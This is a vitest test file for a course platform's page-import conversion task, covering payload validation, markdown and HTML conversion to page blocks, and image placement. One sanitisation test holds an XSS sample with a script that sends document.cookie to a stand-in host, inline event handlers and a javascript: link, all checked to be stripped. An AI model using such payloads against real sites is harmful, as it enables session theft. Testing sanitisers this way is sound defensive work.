/**
 * `page-import-convert`: the payload guard (strict keys, bounded strings), and
 * the run called directly on realistic inputs — its output is the in-process
 * pipeline the web app and the MCP server ran before the conversion moved here
 * (`processMarkdownImport` -> `wrapHtmlContent(html, 2)` -> `htmlToPageBlocks`,
 * or `htmlToPageBlocks` on MCP html), plus the image placement the callers
 * commit by. Also: hostile HTML converts without carrying its scripts, and an
 * output over the cap is answered `too_large` rather than failing the run.
 */
import { afterEach, describe, expect, it, vi } from 'vitest';

vi.mock('@trigger.dev/sdk', () => ({
  schemaTask: (config: object) => config,
  logger: { info: vi.fn(), warn: vi.fn(), error: vi.fn() },
}));

const { pageImportConvert, runPageImportConvert } = await import('../pageImportConvert.ts');
const { parsePageImportPayload, PAGE_IMPORT_CONVERT_TASK_ID, PAGE_IMPORT_PAYLOAD_MAX_BYTES } =
  await import('@classmoji/services/page-import-contract');
const { processMarkdownImport, wrapHtmlContent } =
  await import('@classmoji/services/markdown-importer');
const { htmlToPageBlocks } = await import('@classmoji/page-html');

type Block = {
  id?: string;
  type: string;
  props?: Record<string, unknown>;
  content?: unknown;
  children?: Block[];
};

/** Block ids are random: replaced by position, for comparing two conversions. */
function normalizeIds<T>(value: T): T {
  let n = 0;
  const walk = (node: unknown): unknown => {
    if (Array.isArray(node)) return node.map(walk);
    if (!node || typeof node !== 'object') return node;
    return Object.fromEntries(
      Object.entries(node).map(([k, v]) => [
        k,
        k === 'id' && typeof v === 'string' ? `id-${n++}` : walk(v),
      ])
    );
  };
  return walk(value) as T;
}

/** Every block, depth first. */
function flat(blocks: Block[]): Block[] {
  return blocks.flatMap(b => [b, ...flat(b.children ?? [])]);
}

function textOf(node: unknown): string {
  if (Array.isArray(node)) return node.map(textOf).join('');
  if (!node || typeof node !== 'object') return '';
  const r = node as { text?: unknown; content?: unknown };
  return (typeof r.text === 'string' ? r.text : '') + textOf(r.content);
}

const githubOptions = {
  org: 'test-org',
  repo: 'content-cs101',
  contentPath: 'pages/week-1',
  assetsFolder: 'pages/week-1/assets',
  provider: 'GITHUB',
  slidesUrl: 'https://slides.example.test',
};

const COURSE_MARKDOWN = [
  '# Week 1',
  '',
  'Intro paragraph with **bold** and `code`.',
  '',
  '- ❓ What is a closure?',
  '',
  '    A function with its scope.',
  '',
  '    ```js',
  '    const add = (a)=>(b)=>a+b',
  '    ```',
  '',
  '💡: This is a tip with enough content to be a callout block for sure.',
  '',
  '💻 : run in Terminal',
  '',
  '```bash',
  'npm install',
  '```',
  '',
  '```ts',
  'function f(x:number){return x*2}',
  '```',
  '',
  '## Table',
  '',
  '| a | b |',
  '|---|---|',
  '| 1 | 2 |',
  '',
  '<details><summary>Raw</summary>inner</details>',
  '',
  '💡: Another callout right after a raw html block, long enough to count.',
  '',
].join('\n');

afterEach(() => {
  vi.useRealTimers();
});

describe('the task', () => {
  it('is registered under the id the callers trigger, with the strict parser and no retry', () => {
    expect(pageImportConvert).toMatchObject({
      id: PAGE_IMPORT_CONVERT_TASK_ID,
      schema: parsePageImportPayload,
      retry: { maxAttempts: 1 },
      maxDuration: 60,
      machine: 'medium-2x',
    });
    expect(PAGE_IMPORT_CONVERT_TASK_ID).toBe('page-import-convert');
  });
});

describe('payload guard', () => {
  const markdownPayload = {
    kind: 'markdown',
    markdown: '# x',
    images: ['a.png'],
    options: githubOptions,
  };

  it('accepts the two shapes the callers send', () => {
    expect(parsePageImportPayload({ kind: 'html', html: '<p>x</p>', title: 'T' })).toEqual({
      kind: 'html',
      html: '<p>x</p>',
      title: 'T',
    });
    expect(parsePageImportPayload(markdownPayload)).toEqual(markdownPayload);
    expect(
      parsePageImportPayload({ ...markdownPayload, options: { ...githubOptions, provider: null } })
    ).toMatchObject({ options: { provider: null } });
  });

  it.each([
    ['no object', null],
    ['an unknown kind', { kind: 'pdf', html: '' }],
    ['an unknown key', { kind: 'html', html: '<p>x</p>', bytes: 'AAAA' }],
    ['html over its cap', { kind: 'html', html: 'x'.repeat(500_001) }],
    [
      'markdown over the payload guard',
      { ...markdownPayload, markdown: 'x'.repeat(PAGE_IMPORT_PAYLOAD_MAX_BYTES + 1) },
    ],
    ['a non-string image name', { ...markdownPayload, images: [{ name: 'a.png' }] }],
    ['too many images', { ...markdownPayload, images: Array(2_001).fill('a.png') }],
    ['an unknown option', { ...markdownPayload, options: { ...githubOptions, token: 'x' } }],
    ['an unknown provider', { ...markdownPayload, options: { ...githubOptions, provider: 'X' } }],
    ['a missing option', { ...markdownPayload, options: { ...githubOptions, repo: undefined } }],
    ['an over-long title', { kind: 'html', html: '', title: 't'.repeat(1_001) }],
  ])('refuses %s', (_label, payload) => {
    expect(() => parsePageImportPayload(payload)).toThrow(/\[page-import-convert\]/);
  });
});

describe('markdown', () => {
  /** What the web import ran in process before: importer, wrapper, converter. */
  async function inProcess(
    markdown: string,
    images: Array<{ name: string; index: number }>,
    options: typeof githubOptions,
    title: string
  ) {
    const { html, imageMap, unmatchedImages, missingImages } = await processMarkdownImport(
      markdown,
      images,
      options
    );
    const blocks = await htmlToPageBlocks(wrapHtmlContent(html, 2), { title });
    return { html, imageMap, unmatchedImages, missingImages, blocks };
  }

  it('toggles, emoji callouts, code and terminal fences, tables: the in-process blocks', async () => {
    const payload = parsePageImportPayload({
      kind: 'markdown',
      markdown: COURSE_MARKDOWN,
      title: 'Week 1',
      images: [],
      options: githubOptions,
    });
    const output = await runPageImportConvert(payload);
    const before = await inProcess(COURSE_MARKDOWN, [], githubOptions, 'Week 1');

    expect(output.ok).toBe(true);
    if (!output.ok) return;
    // Through JSON, as the caller receives it.
    const received = JSON.parse(JSON.stringify(output)) as typeof output;
    expect(normalizeIds(received.blocks)).toEqual(
      normalizeIds(JSON.parse(JSON.stringify(before.blocks)))
    );
    expect(received).toMatchObject({ images: [], unmatched: [], missing: [] });

    const all = flat(received.blocks as Block[]);
    const types = all.map(b => b.type);
    // The leading H1 is the title, not content.
    expect(all.some(b => b.type === 'heading' && textOf(b.content) === 'Week 1')).toBe(false);
    const toggle = all.find(b => b.type === 'heading' && b.props?.isToggleable === true);
    expect(textOf(toggle?.content)).toBe('❓ What is a closure?');
    expect(toggle?.children?.map(b => b.type)).toEqual(['paragraph', 'codeBlock']);
    expect(types.filter(t => t === 'callout')).toHaveLength(2);
    expect(types).toContain('terminal');
    expect(types).toContain('table');
    // Code fences come out formatted by prettier (Node build), as before.
    const ts = all.find(b => b.type === 'codeBlock' && b.props?.language === 'typescript');
    expect(textOf(ts?.content)).toBe('function f(x: number) {\n  return x * 2;\n}');
  });

  it('places matched uploads where the HTML points, by position, and lists the rest', async () => {
    vi.useFakeTimers({ toFake: ['Date'] });
    vi.setSystemTime(1_700_000_000_000);
    const markdown = [
      '# Lab 2',
      '',
      '![diagram](Lab%202%20(Vite)/diagram.png)',
      '',
      '![[photo.JPG]]',
      '',
      '![missing](nothere.png)',
      '',
      '![remote](https://cdn.example.test/x.png)',
      '',
    ].join('\n');
    // Two uploads share a name: positions, not names, tell them apart.
    const names = ['diagram.png', 'photo.jpg', 'extra.gif', 'diagram.png'];
    const output = await runPageImportConvert(
      parsePageImportPayload({
        kind: 'markdown',
        markdown,
        title: 'Lab 2',
        images: names,
        options: {
          ...githubOptions,
          contentPath: 'pages/lab-2',
          assetsFolder: 'pages/lab-2/assets',
        },
      })
    );
    const before = await inProcess(
      markdown,
      names.map((name, index) => ({ name, index })),
      { ...githubOptions, contentPath: 'pages/lab-2', assetsFolder: 'pages/lab-2/assets' },
      'Lab 2'
    );
    if (!output.ok) throw new Error('expected blocks');

    const raw = (file: string) =>
      `https://raw.githubusercontent.com/test-org/content-cs101/main/pages/lab-2/assets/${file}`;
    expect(output.images).toEqual([
      {
        originalPath: 'Lab 2 (Vite)/diagram.png',
        index: 0,
        newPath: 'pages/lab-2/assets/diagram-1700000000000.png',
        newFilename: 'diagram-1700000000000.png',
        githubUrl: raw('diagram-1700000000000.png'),
      },
      {
        originalPath: 'photo.JPG',
        index: 1,
        newPath: 'pages/lab-2/assets/photo-1700000000000.jpg',
        newFilename: 'photo-1700000000000.jpg',
        githubUrl: raw('photo-1700000000000.jpg'),
      },
    ]);
    // The gif matched nothing: the caller commits it too. The second diagram.png
    // shares a matched name and, as before the move, is not committed at all.
    expect(output.unmatched).toEqual([2]);
    expect(before.unmatchedImages.map(u => u.index)).toEqual([2]);
    // Every referenced file name with no upload, remote ones included (as before).
    expect(output.missing).toEqual(['nothere.png', 'x.png']);
    expect(normalizeIds(output.blocks)).toEqual(normalizeIds(before.blocks));
    const urls = flat(output.blocks as Block[])
      .filter(b => b.type === 'image')
      .map(b => b.props?.url);
    expect(urls).toEqual([
      raw('diagram-1700000000000.png'),
      raw('photo-1700000000000.jpg'),
      'nothere.png',
      'https://cdn.example.test/x.png',
    ]);
  });

  it('a Google Docs export with a ~1 MB data: screenshot converts, the image kept', async () => {
    const dataUrl = `data:image/png;base64,${'iVBORw0KGgo'.repeat(91_000)}`;
    const markdown = `# Notes\n\nBefore the screenshot.\n\n![image1](${dataUrl})\n\nAfter it.\n`;
    expect(markdown.length).toBeGreaterThan(1_000_000);
    const output = await runPageImportConvert(
      parsePageImportPayload({
        kind: 'markdown',
        markdown,
        title: 'Notes',
        images: [],
        options: githubOptions,
      })
    );
    if (!output.ok) throw new Error('expected blocks');
    const image = flat(output.blocks as Block[]).find(b => b.type === 'image');
    expect(image?.props?.url).toBe(dataUrl);
    expect(textOf(flat(output.blocks as Block[]))).toContain('After it.');
    expect(output.missing).toEqual([]);
  });

  it('a Gitlab import points at the slides origin the caller passed', async () => {
    const output = await runPageImportConvert(
      parsePageImportPayload({
        kind: 'markdown',
        markdown: '# Lab 3\n\n![d](images/d.png)\n',
        images: ['d.png'],
        options: {
          ...githubOptions,
          org: 'test-group',
          provider: 'GITLAB',
          slidesUrl: 'https://slides.example.test/',
          contentPath: 'pages/lab-3',
          assetsFolder: 'pages/lab-3/assets',
        },
      })
    );
    if (!output.ok) throw new Error('expected blocks');
    expect(output.images?.[0].githubUrl).toMatch(
      /^https:\/\/slides\.example\.test\/content\/test-group\/content-cs101\/pages\/lab-3\/assets\/d-\d+\.png$/
    );
  });
});

describe('html (MCP page_create)', () => {
  it('converts exactly as the service converted it in process', async () => {
    const html =
      '<h1>Agent Page</h1><h2>Setup</h2><p>from <strong>markdown</strong></p><ul><li>one</li></ul>' +
      '<table><tr><th>a</th><th>b</th></tr><tr><td>1</td><td>2</td></tr></table>' +
      '<details><summary>More</summary><p>hidden</p></details>' +
      '<pre><code class="language-js">x = 1</code></pre>';
    const output = await runPageImportConvert(
      parsePageImportPayload({ kind: 'html', html, title: 'Agent Page' })
    );
    if (!output.ok) throw new Error('expected blocks');
    expect(normalizeIds(JSON.parse(JSON.stringify(output.blocks)))).toEqual(
      normalizeIds(
        JSON.parse(JSON.stringify(await htmlToPageBlocks(html, { title: 'Agent Page' })))
      )
    );
    expect(output).not.toHaveProperty('images');
    // The leading <h1> repeating the title is dropped.
    expect((output.blocks as Block[])[0]).toMatchObject({ type: 'heading', props: { level: 2 } });
  });

  it('reads the body of a full document, and nothing from its head', async () => {
    const output = await runPageImportConvert(
      parsePageImportPayload({
        kind: 'html',
        html:
          '<!DOCTYPE html><html lang="en"><head><meta charset="utf-8">' +
          '<style>body { margin: 0 auto; }</style></head><body><p>Only this</p></body></html>',
        title: 'Wrapped',
      })
    );
    if (!output.ok) throw new Error('expected blocks');
    expect((output.blocks as Block[]).map(b => b.type)).toEqual(['paragraph']);
    expect(JSON.stringify(output.blocks)).toContain('Only this');
    expect(JSON.stringify(output.blocks)).not.toContain('margin');
  });

  it('hostile html converts without carrying its scripts or handlers', async () => {
    const html =
      '<script>fetch("https://evil.example.test/" + document.cookie)</script>' +
      '<p onclick="alert(1)">Click <a href="javascript:alert(1)">me</a></p>' +
      '<img src="x" onerror="alert(2)">' +
      '<iframe src="https://evil.example.test"></iframe>' +
      '<div>'.repeat(200) +
      'deep' +
      '</div>'.repeat(200);
    const output = await runPageImportConvert(parsePageImportPayload({ kind: 'html', html }));
    if (!output.ok) throw new Error('expected blocks');
    const json = JSON.stringify(output.blocks);
    expect(json).not.toContain('document.cookie');
    expect(json).not.toContain('onerror');
    expect(json).not.toContain('onclick');
    expect(json).toContain('deep');
  });

  it('keeps concurrent conversions apart', async () => {
    const inputs = Array.from(
      { length: 6 },
      (_, i) => `<h2>Doc ${i}</h2><p>Body of document ${i}</p><ul><li>item ${i}</li></ul>`
    );
    const results = await Promise.all(
      inputs.map(html => runPageImportConvert(parsePageImportPayload({ kind: 'html', html })))
    );
    results.forEach((output, i) => {
      if (!output.ok) throw new Error('expected blocks');
      const text = textOf(flat(output.blocks as Block[]));
      expect(text).toContain(`Body of document ${i}`);
      for (let j = 0; j < inputs.length; j++) {
        if (j !== i) expect(text).not.toContain(`document ${j}`);
      }
    });
  });
});

describe('output cap', () => {
  it('answers too_large instead of returning an output Trigger.dev would refuse', async () => {
    vi.resetModules();
    vi.doMock('@classmoji/services/page-import-contract', async importOriginal => ({
      ...(await importOriginal<object>()),
      PAGE_IMPORT_OUTPUT_MAX_BYTES: 500,
    }));
    try {
      const { runPageImportConvert: run } = await import('../pageImportConvert.ts');
      const html = Array.from({ length: 20 }, (_, i) => `<p>Paragraph ${i}</p>`).join('');
      await expect(run({ kind: 'html', html })).resolves.toEqual({
        ok: false,
        code: 'too_large',
      });
      await expect(run({ kind: 'html', html: '<p>x</p>' })).resolves.toMatchObject({ ok: true });
    } finally {
      vi.doUnmock('@classmoji/services/page-import-contract');
      vi.resetModules();
    }
  });
});
